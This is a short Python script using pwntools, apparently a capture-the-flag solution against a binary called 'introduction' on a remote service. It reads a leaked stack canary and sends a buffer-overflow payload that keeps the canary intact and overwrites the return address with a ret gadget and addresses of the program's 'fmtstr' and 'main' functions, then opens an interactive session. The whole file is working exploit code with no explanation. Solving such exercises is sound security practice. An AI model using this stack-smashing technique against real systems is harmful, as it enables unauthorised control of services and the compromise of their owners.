from pwn import *

exe = ELF('./introduction')
io = remote('103.245.250.17', 30006)
#gdb.attach(io, api=True)

ret = 0x000000000040072e

io.recvuntil(b'later): 0x')
canary = int(io.recvline(keepends=False), 16)
io.recvuntil(b'stack.')

payload = b'a'*72 + p64(canary) + b'a'*8 + p64(ret) + p64(exe.sym['fmtstr']) + p64(exe.sym['main'])
io.sendline(payload)

io.interactive()